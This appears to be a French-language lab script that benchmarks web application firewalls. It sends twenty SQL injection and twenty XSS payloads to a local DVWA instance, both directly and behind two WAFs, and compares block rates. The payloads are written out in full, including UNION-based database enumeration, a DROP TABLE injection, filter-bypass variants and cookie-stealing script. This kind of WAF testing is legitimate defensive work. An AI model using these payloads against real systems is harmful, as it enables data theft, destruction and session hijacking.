
"""
Phase 4 — Script d'attaque custom
SQLi + XSS contre DVWA direct et WAF Custom
"""

import requests
import json
import os
import time
from datetime import datetime, timezone

# ══════════════════════════════════════════════════════
#  Configuration
# ══════════════════════════════════════════════════════
TARGETS = {
        "waf_custom":  "http://localhost:8070",
        "dvwa_direct": "http://localhost:8080",
        "waf":  "http://localhost:8090",
       


}

# OUTPUT_DIR = "/results"
OUTPUT_DIR = os.path.join(os.getcwd(), "results")
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ══════════════════════════════════════════════════════
#  Payloads SQLi
# ══════════════════════════════════════════════════════
SQLI_PAYLOADS = [
    # Basiques
    {"id": "SQLi-01", "payload": "' OR 1=1--",           "desc": "OR 1=1 classique"},
    {"id": "SQLi-02", "payload": "' OR '1'='1",           "desc": "Tautologie simple"},
    {"id": "SQLi-03", "payload": "1 UNION SELECT 1,2--",  "desc": "UNION SELECT 2 colonnes"},
    {"id": "SQLi-04", "payload": "1 UNION SELECT 1,2,3--","desc": "UNION SELECT 3 colonnes"},
    {"id": "SQLi-05", "payload": "1' ORDER BY 1--",       "desc": "ORDER BY enumeration"},
    {"id": "SQLi-06", "payload": "1' ORDER BY 2--",       "desc": "ORDER BY enumeration"},
    {"id": "SQLi-07", "payload": "1' ORDER BY 3--",       "desc": "ORDER BY enumeration"},
    # Blind
    {"id": "SQLi-08", "payload": "1' AND SLEEP(2)--",     "desc": "Time-based blind"},
    {"id": "SQLi-09", "payload": "1' AND 1=1--",          "desc": "Boolean-based blind TRUE"},
    {"id": "SQLi-10", "payload": "1' AND 1=2--",          "desc": "Boolean-based blind FALSE"},
    # Enumération
    {"id": "SQLi-11", "payload": "' UNION SELECT table_name,2 FROM information_schema.tables--",
                                                           "desc": "Enum tables"},
    {"id": "SQLi-12", "payload": "' UNION SELECT user(),2--",
                                                           "desc": "MySQL user()"},
    {"id": "SQLi-13", "payload": "' UNION SELECT database(),2--",
                                                           "desc": "MySQL database()"},
    {"id": "SQLi-14", "payload": "' UNION SELECT version(),2--",
                                                           "desc": "MySQL version()"},
    # Obfuscation
    {"id": "SQLi-15", "payload": "1'/**/OR/**/1=1--",     "desc": "Bypass avec commentaires"},
    {"id": "SQLi-16", "payload": "1' oR '1'='1",          "desc": "Bypass casse mixte"},
    {"id": "SQLi-17", "payload": "1%27%20OR%201%3D1--",   "desc": "URL encoded"},
    {"id": "SQLi-18", "payload": "' OR 1=1#",             "desc": "Commentaire MySQL #"},
    {"id": "SQLi-19", "payload": "admin'--",              "desc": "Auth bypass username"},
    {"id": "SQLi-20", "payload": "' DROP TABLE users--",  "desc": "DROP TABLE"},
]

# ══════════════════════════════════════════════════════
#  Payloads XSS
# ══════════════════════════════════════════════════════
XSS_PAYLOADS = [
    # Basiques
    {"id": "XSS-01", "payload": "<script>alert(1)</script>",
                                 "desc": "Script tag basique"},
    {"id": "XSS-02", "payload": "<script>alert('XSS')</script>",
                                 "desc": "Script tag string"},
    {"id": "XSS-03", "payload": "<img src=x onerror=alert(1)>",
                                 "desc": "IMG onerror"},
    {"id": "XSS-04", "payload": "<svg onload=alert(1)>",
                                 "desc": "SVG onload"},
    {"id": "XSS-05", "payload": "javascript:alert(1)",
                                 "desc": "Javascript URI"},
    # Event handlers
    {"id": "XSS-06", "payload": "<body onload=alert(1)>",
                                 "desc": "Body onload"},
    {"id": "XSS-07", "payload": "<input onfocus=alert(1) autofocus>",
                                 "desc": "Input onfocus"},
    {"id": "XSS-08", "payload": "<div onmouseover=alert(1)>hover</div>",
                                 "desc": "Div onmouseover"},
    # Bypass filtres
    {"id": "XSS-09", "payload": "<ScRiPt>alert(1)</sCrIpT>",
                                 "desc": "Bypass casse mixte"},
    {"id": "XSS-10", "payload": "<script >alert(1)</script >",
                                 "desc": "Bypass espace dans tag"},
    {"id": "XSS-11", "payload": "<%73cript>alert(1)</script>",
                                 "desc": "URL encoding partiel"},
    {"id": "XSS-12", "payload": "<scr\x00ipt>alert(1)</script>",
                                 "desc": "Null byte injection"},
    # DOM XSS
    {"id": "XSS-13", "payload": "\"><script>alert(document.cookie)</script>",
                                 "desc": "Cookie stealing"},
    {"id": "XSS-14", "payload": "';alert(1);//",
                                 "desc": "JS context injection"},
    {"id": "XSS-15", "payload": "<iframe src=javascript:alert(1)>",
                                 "desc": "Iframe javascript URI"},
    # Encodés
    {"id": "XSS-16", "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
                                 "desc": "HTML entities encoded"},
    {"id": "XSS-17", "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
                                 "desc": "URL encoded"},
    {"id": "XSS-18", "payload": "<img src=1 onerror=alert(document.domain)>",
                                 "desc": "Domain exfiltration"},
    {"id": "XSS-19", "payload": "<details open ontoggle=alert(1)>",
                                 "desc": "Details ontoggle HTML5"},
    {"id": "XSS-20", "payload": "<video><source onerror=alert(1)>",
                                 "desc": "Video source onerror"},
]

# ══════════════════════════════════════════════════════
#  Points d'injection DVWA
# ══════════════════════════════════════════════════════
INJECTION_POINTS = {
    "sqli": [
        {"method": "GET",  "path": "/vulnerabilities/sqli/",
         "param": "id",    "extra": {"Submit": "Submit"}},
        {"method": "POST", "path": "/vulnerabilities/sqli/",
         "param": "id",    "extra": {"Submit": "Submit"}},
    ],
    "xss": [
        {"method": "GET",  "path": "/vulnerabilities/xss_r/",
         "param": "name",  "extra": {}},
        {"method": "POST", "path": "/vulnerabilities/xss_s/",
         "param": "txtName","extra": {"mtxMessage": "test", "btnSign": "Sign Guestbook"}},
        # {"method": "GET",  "path": "/vulnerabilities/xss_d/",
        #  "param": "default","extra": {}},
    ],
}

# ══════════════════════════════════════════════════════
#  Session DVWA
# ══════════════════════════════════════════════════════
def get_dvwa_session(base_url):
    """Crée une session authentifiée sur DVWA."""
    session = requests.Session()
    session.headers.update({"User-Agent": "CustomWAF-Scanner/1.0"})

    try:
        # Login
        login_url = f"{base_url}/login.php"
        resp = session.get(login_url, timeout=10)

        # Extraire le token CSRF si présent
        token = ""
        if "user_token" in resp.text:
            import re
            match = re.search(r"name='user_token' value='([^']+)'", resp.text)
            if match:
                token = match.group(1)

        data = {
            "username":   "admin",
            "password":   "password",
            "Login":      "Login",
            "user_token": token,
        }

        resp = session.post(login_url, data=data, timeout=10)

        # Passer en mode Low
        session.post(
            f"{base_url}/security.php",
            data={"security": "low", "seclev_submit": "Submit"},
            timeout=10
        )

        print(f"[AUTH] Session créée sur {base_url}")
        return session

    except Exception as e:
        print(f"[WARN] Auth échouée sur {base_url} : {e}")
        return session


# ══════════════════════════════════════════════════════
#  Moteur d'attaque
# ══════════════════════════════════════════════════════
def send_payload(session, base_url, point, payload_str):
    """Envoie un payload sur un point d'injection."""
    url    = f"{base_url}{point['path']}"
    method = point["method"]
    param  = point["param"]
    extra  = point.get("extra", {})

    try:
        if method == "GET":
            params = {param: payload_str, **extra}
            resp   = session.get(url, params=params, timeout=8,
                                 allow_redirects=True)
        else:
            data = {param: payload_str, **extra}
            resp  = session.post(url, data=data, timeout=8,
                                  allow_redirects=True)

        return {
            "status_code":  resp.status_code,
            "response_len": len(resp.text),
            "blocked":      resp.status_code == 403,
            "reflected":    payload_str[:20] in resp.text,
            "waf_header":   resp.headers.get("X-WAF-Block", ""),
        }

    except requests.exceptions.ConnectionError:
        return {"status_code": 0, "blocked": True,
                "error": "Connection refused"}
    except requests.exceptions.Timeout:
        return {"status_code": 0, "blocked": False,
                "error": "Timeout"}
    except Exception as e:
        return {"status_code": 0, "blocked": False,
                "error": str(e)}


# ══════════════════════════════════════════════════════
#  Scanner principal
# ══════════════════════════════════════════════════════
def scan_target(target_name, base_url):
    print(f"\n{'█'*55}")
    print(f"  SCAN : {target_name}")
    print(f"  URL  : {base_url}")
    print(f"{'█'*55}")

    session = get_dvwa_session(base_url)
    results = {
        "target":      target_name,
        "url":         base_url,
        "timestamp":   datetime.now(timezone.utc).isoformat(),
        "sqli":        [],
        "xss":         [],
        "summary":     {},
    }

    # ── SQLi ─────────────────────────────────────────
    print(f"\n[*] Tests SQLi ({len(SQLI_PAYLOADS)} payloads)...")
    sqli_blocked = 0
    sqli_passed  = 0

    for pt in INJECTION_POINTS["sqli"]:
        for p in SQLI_PAYLOADS:
            resp = send_payload(session, base_url, pt, p["payload"])
            time.sleep(0.1)

            status = "BLOCKED" if resp.get("blocked") else "PASSED"
            icon   = "🚫" if resp.get("blocked") else "✅"

            print(f"  {icon} [{p['id']}] {status:7} | "
                  f"HTTP {resp.get('status_code',0):3} | "
                  f"{p['desc']}")

            entry = {
                "rule_id":     p["id"],
                "desc":        p["desc"],
                "payload":     p["payload"],
                "method":      pt["method"],
                "endpoint":    pt["path"],
                "status_code": resp.get("status_code", 0),
                "blocked":     resp.get("blocked", False),
             
            }
            results["sqli"].append(entry)

            if resp.get("blocked"):
                sqli_blocked += 1
            else:
                sqli_passed += 1

    # ── XSS ──────────────────────────────────────────
    print(f"\n[*] Tests XSS ({len(XSS_PAYLOADS)} payloads)...")
    xss_blocked = 0
    xss_passed  = 0

    for pt in INJECTION_POINTS["xss"]:
        for p in XSS_PAYLOADS:
            resp = send_payload(session, base_url, pt, p["payload"])
            time.sleep(0.1)

            status = "BLOCKED" if resp.get("blocked") else "PASSED"
            icon   = "🚫" if resp.get("blocked") else "✅"

            print(f"  {icon} [{p['id']}] {status:7} | "
                  f"HTTP {resp.get('status_code',0):3} | "
                  f"{p['desc']}")

            entry = {
                "rule_id":     p["id"],
                "desc":        p["desc"],
                "payload":     p["payload"],
                "method":      pt["method"],
                "endpoint":    pt["path"],
                "status_code": resp.get("status_code", 0),
                "blocked":     resp.get("blocked", False),
                "reflected":   resp.get("reflected", False),
              
            }
            results["xss"].append(entry)

            if resp.get("blocked"):
                xss_blocked += 1
            else:
                xss_passed += 1

    # ── Résumé ────────────────────────────────────────
    total_payloads = (len(SQLI_PAYLOADS) * len(INJECTION_POINTS["sqli"]) +
                      len(XSS_PAYLOADS)  * len(INJECTION_POINTS["xss"]))
    total_blocked  = sqli_blocked + xss_blocked
    total_passed   = sqli_passed  + xss_passed

    results["summary"] = {
        "total_payloads":  total_payloads,
        "total_blocked":   total_blocked,
        "total_passed":    total_passed,
        "block_rate_pct":  round((total_blocked / total_payloads) * 100, 1),
        "sqli_blocked":    sqli_blocked,
        "sqli_passed":     sqli_passed,
        "sqli_block_rate": round((sqli_blocked /
                           (len(SQLI_PAYLOADS) * len(INJECTION_POINTS["sqli"]))) * 100, 1),
        "xss_blocked":     xss_blocked,
        "xss_passed":      xss_passed,
        "xss_block_rate":  round((xss_blocked /
                           (len(XSS_PAYLOADS) * len(INJECTION_POINTS["xss"]))) * 100, 1),
    }

    print(f"\n  ── Résumé {target_name} ──")
    print(f"  Total payloads : {total_payloads}")
    print(f"  Bloqués        : {total_blocked} ({results['summary']['block_rate_pct']}%)")
    print(f"  Passés         : {total_passed}")
    print(f"  SQLi block rate: {results['summary']['sqli_block_rate']}%")
    print(f"  XSS  block rate: {results['summary']['xss_block_rate']}%")

    return results


# ══════════════════════════════════════════════════════
#  Rapport JSON
# ══════════════════════════════════════════════════════
def generate_report(all_results):
    timestamp   = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = f"{OUTPUT_DIR}/rapport_phase4_{timestamp}.json"
   

    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "targets":      all_results,
        "comparison":   {},
    }

  
    if "dvwa_direct" in all_results and "waf_custom" in all_results:
        d = all_results["dvwa_direct"]["summary"]
        c = all_results["waf_custom"]["summary"]
        e = all_results["waf"]["summary"]

        report["comparison"] = {
            "dvwa_block_rate":     d["block_rate_pct"],
            "custom_waf_block_rate": c["block_rate_pct"],
            "waf_block_rate":      e["block_rate_pct"],
            

            "waf_efficiency":      round(e["block_rate_pct"] - d["block_rate_pct"], 1),
            "waf_sqli_improvement":    round(e["sqli_block_rate"] - d["sqli_block_rate"], 1),
            "waf_xss_improvement":     round(e["xss_block_rate"]  - d["xss_block_rate"],  1),
            
            "custom_waf_efficiency":      round(c["block_rate_pct"] - d["block_rate_pct"], 1),
            "custom_waf_sqli_improvement":    round(c["sqli_block_rate"] - d["sqli_block_rate"], 1),
            "custom_waf_xss_improvement":     round(c["xss_block_rate"]  - d["xss_block_rate"],  1),
            "conclusion": (
                f"\nLe WAF custom bloque {c['block_rate_pct']}% des attaques "
                f"\nLe WAF standard bloque {e['block_rate_pct']}% des attaques "
                f"\nLe WAF custom bloque {c['block_rate_pct']}% des attaques "
                f"\nLe WAF standard bloque {round(e['block_rate_pct'] - c['block_rate_pct'], 1)}% plus d'attaques que le waf custom  "
              
            )
        }

        # Affichage tableau comparatif
        print(f"\n{'='*60}")
        print(f"   COMPARAISON FINALE")
        print(f"{'='*60}")
        print(f"  {'Métrique':<25} {'DVWA Direct':>12} {'WAF Custom':>12} {'WAF':>12}")
        print(f"  {'-'*50}")
        metrics = [
            ("Total payloads",  d['total_payloads'],  c['total_payloads'], e['total_payloads']),
            ("Bloqués",         d['total_blocked'],   c['total_blocked'], e['total_blocked']),
            ("Taux blocage",    f"{d['block_rate_pct']}%", f"{c['block_rate_pct']}%", f"{e['block_rate_pct']}%"),
            ("SQLi block rate", f"{d['sqli_block_rate']}%", f"{c['sqli_block_rate']}%", f"{e['sqli_block_rate']}%"),
            ("XSS  block rate", f"{d['xss_block_rate']}%",  f"{c['xss_block_rate']}%", f"{e['xss_block_rate']}%"),
        ]
        for label, dval, cval, eval in metrics:
            print(f"  {label:<25} {str(dval):>12} {str(cval):>12} {str(eval):>12}")
        print(f"{'='*60}")
        print(f"  Conclusion : {report['comparison']['conclusion']}")
        print(f"{'='*60}")

    # Sauvegarder
    with open(report_file, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)


    print(f"\n[RAPPORT] {report_file}")
 
    return report_file


# ══════════════════════════════════════════════════════
#  Main
# ══════════════════════════════════════════════════════
if __name__ == "__main__":
    print("\n" + "█"*55)
    print("  PHASE 4 — ATTAQUES CUSTOM SQLi + XSS")
    print("  DVWA Direct  vs  WAF Custom")
    print("█"*55)

    all_results = {}
    for name, url in TARGETS.items():
        all_results[name] = scan_target(name, url)

    generate_report(all_results)
